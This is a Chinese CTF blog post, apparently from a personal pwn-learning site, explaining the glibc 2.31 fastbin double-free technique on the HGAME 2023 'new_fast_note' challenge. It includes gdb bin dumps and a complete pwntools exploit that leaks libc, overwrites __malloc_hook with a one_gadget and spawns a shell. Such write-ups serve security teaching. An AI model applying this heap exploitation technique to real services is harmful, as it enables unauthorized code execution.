@@ -1,0 +1,225 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Double_free | X1z1的个人博客</title><meta name="author" content="xizi"><meta name="copyright" content="xizi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Double Free顾名思义就是进行两次free的操作。不过为什么要进行两次的free呢？ 因为通过这样的手法就可以实现任意地址读写。 [HGAME 2023 week2]new_fast_note12345678910111213141516171819202122232425262728293031323334353637int __fastcall __noreturn main(int">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Double_free">
+<meta property="og:url" content="http://example.com/2026/02/19/Double-free/index.html">
+<meta property="og:site_name" content="X1z1的个人博客">
+<meta property="og:description" content="Double Free顾名思义就是进行两次free的操作。不过为什么要进行两次的free呢？ 因为通过这样的手法就可以实现任意地址读写。 [HGAME 2023 week2]new_fast_note12345678910111213141516171819202122232425262728293031323334353637int __fastcall __noreturn main(int">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avatar.jpg">
+<meta property="article:published_time" content="2026-02-19T14:26:27.000Z">
+<meta property="article:modified_time" content="2026-02-19T14:27:03.366Z">
+<meta property="article:author" content="xizi">
+<meta property="article:tag" content="pwn进阶">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.jpg"><script type="application/ld+json"></script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/02/19/Double-free/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Double_free',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'posts'
+}</script><link rel="stylesheet" href="/css/_custom/custom.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page" id="body-wrap"><header class="not-home-page" id="page-header" style="background-image: url(/img/bg.jepg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">X1z1的个人博客</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div></div></nav><div id="page-site-info"><h1 id="site-title">Double_free</h1></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a><code>Double Free</code></h2><p>顾名思义就是进行两次free的操作。不过为什么要进行两次的free呢？</p>
+<p>因为通过这样的手法就可以实现任意地址读写。</p>
+<h3 id="HGAME-2023-week2-new-fast-note"><a href="#HGAME-2023-week2-new-fast-note" class="headerlink" title="[HGAME 2023 week2]new_fast_note"></a><code>[HGAME 2023 week2]new_fast_note</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n4; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n4);</span><br><span class="line">    <span class="keyword">if</span> ( n4 == <span class="number">4</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( n4 &gt; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong choice!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( n4 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          show_note();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          add_note();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          delete_note(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>依旧是菜单函数。版本是2.31的。那么此时的tcache bins管理引入了double free的检测。也就是说我们不能通过在tcache bins中double free。所以我们可以在fast bins中进行double free。</p>
+<p>首先我们需要泄露出libc。由于fast bins能管理的堆块最大的大小是0x80。所以我们可以先申请9个0x80字节大小的堆块。再释放掉八个。其中七个会被tcache bins管理，而一个会被unsorted bin管理，还有一个由我们管理的堆块则是为了防止我们free掉堆块后与top chunk合并。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x1ecbe0</span></span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br></pre></td></tr></table></figure>
+
+<p>然后我们就可以通过修改malloc_hook为one_gadget来getshell了。由于我们现在泄露出了libc_base，所以可以轻松得到__malloc_hook和one_gadget的地址。现在就要进行double free的操作了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x60</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br></pre></td></tr></table></figure>
+
+<p>首先我们先申请了8个堆块，为了后续占满tcache bins。这里free后也会占到一个fast bins。然后再申请8和9两个堆块并且释放。那么此时这里fast bins的管理情况是怎么样的呢？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x70: 0x55555555bab0 —▸ 0x55555555bb20 ◂— 0x55555555bab0</span><br></pre></td></tr></table></figure>
+
+<p>可以看出，出现了8-&gt;9-&gt;8的一种情况。这个时候当我们申请掉8，并向8中写入__malloc_hook的真实地址会发生什么呢？</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x60</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>,p64(malloc_hook))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">0x70 [  3]: 0x55555555bb30 —▸ 0x55555555bac0 —▸ 0x7ffff7fc1b70 (__malloc_hook) ◂— 0</span><br></pre></td></tr></table></figure>
+
+<p>可以看出，我们fast bins管理的堆块不仅移到了tcache bins管理，并且这里最后成了__malloc_hook。那么我们再连续申请三个堆块就可以往malloc_hook里写入我们的one_gadget了。下次我们再次申请堆块的时候就可以getshell了。</p>
+<p>这里从fast bins迁移到是tcache bins是因为我们申请的8个堆块有一个是从fast bins里取出的。那么此时程序就会认为既然你有需求，那下次再申请的时候就要提前准备，因为tcache bins管理更加快捷。所以就会迁移过来。</p>
+<p>而这里的__malloc_hook的写入，就是我们申请的idx&#x3D;7的堆块，也就是说双重释放的堆块的fd是可以改写的。这就帮助了我们进行任意地址的写入。</p>
+<p>下面给出完整的exp。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;node5.anna.nssctf.cn&#x27;,24203)</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,pl</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    io.send(pl)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x1ecbe0</span></span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line">one_gadget = [<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">malloc_hook = base + libc.sym.__malloc_hook</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x60</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x60</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>,p64(malloc_hook))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,p64(base+one_gadget[<span class="number">1</span>]))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;: &#x27;</span>,<span class="string">b&#x27;0x20&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">xizi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2026/02/19/Double-free/">http://example.com/2026/02/19/Double-free/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">X1z1的个人博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn%E8%BF%9B%E9%98%B6/">pwn进阶</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav id="pagination"><div class="pagination"></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/02/19/UAF/" title="UAF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-19</div><div class="info-item-2">UAF</div></div><div class="info-2"><div class="info-item-1">UAFUse After Free：即free后再次进行利用。Dangling Pointer（悬挂指针、悬空指针、迷途指针）是计算机编程中的一个常见且危险的问题，它指的是一个指针仍然保留着之前指向的内存地址，但是这片内存区域可能已经被释放或者不再有效，从而可能导致程序在使用该指针时出现未定义行为。 1.[NISACTF 2022]UAF[NISACTF 2022]UAF | NSSCTF 123456789101112131415161718192021222324252627282930313233343536373839404142434445int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  _DWORD v3[4]; // [esp+8h] [ebp-10h] BYREF  v3[1] = __readgsdword(0x14u);  setbuf(stdin, 0);  setbuf(stdout, 0);  while ( 1 )  &#123;    ...</div></div></div></a><a class="pagination-related" href="/2026/02/19/Unlink-attack/" title="Unlink_attack"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-19</div><div class="info-item-2">Unlink_attack</div></div><div class="info-2"><div class="info-item-1">Unlink attackunlink，俗称拖链，将unsorted_bin中的处于free状态的堆块脱离出来，然后和物理地址相邻的新free的堆块合并成大堆块（可以是向前合并或者向后合并），合并完之后再放入unsorted_bin中。 一般产生漏洞的原因是通过off-by-null，off-by-one，堆溢出，修改了堆块的p标志位。 [SUCTF 2018 招新赛]unlink1234567891011121314151617181920212223242526272829303132333435int __fastcall main(int argc, const char **argv, const char **envp)&#123;  int v4; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v5; // [rsp+8h] [rbp-8h]  v5 = __readfsqword(0x28u);  init(argc, argv, envp);  puts(&quot;welcome to note system&quo...</div></div></div></a><a class="pagination-related" href="/2026/02/19/Unsorted-bin-attack/" title="Unsorted_bin_attack"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-19</div><div class="info-item-2">Unsorted_bin_attack</div></div><div class="info-2"><div class="info-item-1">Unsorted bin attack说是unsorted bin attack，在这里其实只是一个借助unsorted bin 来泄露libc的一种手段。 unsorted bin是一个双向链表，具体可以用下面这张图来演示。  所以，如果当我们能访问到尾节点的时候，就可以打印出尾节点的fd，指向的就是main_arena的地址，从而泄露出libc的基地址。 [HNCTF 2022 WEEK4]ez_uaf123456789101112131415161718192021222324252627282930313233343536373839404142int __fastcall __noreturn main(int argc, const char **argv, const char **envp)&#123;  int n4; // [rsp+Ch] [rbp-4h]  init_env(argc, argv, envp);  puts(&quot;Easy Note.&quot;);  while ( 1 )  &#123;    while ( 1 )    &#1...</div></div></div></a><a class="pagination-related" href="/2026/02/19/off-by-one/" title="off_by_one"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-19</div><div class="info-item-2">off_by_one</div></div><div class="info-2"><div class="info-item-1">off-by-oneoff-by-one是指单字节缓冲区溢出其实不仅在堆里出现，在栈上也是一种可以利用的漏洞。不过在这里就仅仅考虑在堆上的利用。 1.[HNCTF 2022 WEEK4] EZheap[HNCTF 2022 WEEK4]ezheap | NSSCTF 123456789101112131415161718192021222324252627282930313233343536373839404142int __fastcall __noreturn main(int argc, const char **argv, const char **envp)&#123;  int n4; // [rsp+Ch] [rbp-4h]  init_env(argc, argv, envp);  puts(&quot;Easy Note.&quot;);  while ( 1 )  &#123;    while ( 1 )    &#123;      menu();      n4 = getnum();      if ( n4 != 4 )        break; ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xizi</div><div class="author-info-description">CTF Player | PWN</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xi-zi"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">PWN from zero to one .有问题之处，望多海涵。</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/19/Unlink-attack/" title="Unlink_attack">Unlink_attack</a><time datetime="2026-02-19T14:27:22.000Z" title="发表于 2026-02-19 22:27:22">2026-02-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/19/Double-free/" title="Double_free">Double_free</a><time datetime="2026-02-19T14:26:27.000Z" title="发表于 2026-02-19 22:26:27">2026-02-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/19/Unsorted-bin-attack/" title="Unsorted_bin_attack">Unsorted_bin_attack</a><time datetime="2026-02-19T14:24:57.000Z" title="发表于 2026-02-19 22:24:57">2026-02-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/19/off-by-one/" title="off_by_one">off_by_one</a><time datetime="2026-02-19T14:23:51.000Z" title="发表于 2026-02-19 22:23:51">2026-02-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/19/UAF/" title="UAF">UAF</a><time datetime="2026-02-19T14:22:29.000Z" title="发表于 2026-02-19 22:22:29">2026-02-19</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            
+          </div>
+          <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/heap/"><span class="card-category-list-name">heap</span><span class="card-category-list-count">6</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/stack/"><span class="card-category-list-name">stack</span><span class="card-category-list-count">10</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"><span class="card-category-list-name">数据结构</span><span class="card-category-list-count">1</span></a></li>
+          </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.23em; color: #999ea6">C语言</a> <a href="/tags/pwn%E5%85%A5%E9%97%A8/" style="font-size: 1.5em; color: #99a9bf">pwn入门</a> <a href="/tags/pwn/" style="font-size: 1.1em; color: #999">pwn</a> <a href="/tags/pwn%E8%BF%9B%E9%98%B6/" style="font-size: 1.37em; color: #99a4b2">pwn进阶</a></div></div><div class="card-widget card-archives">
+    <div class="item-headline">
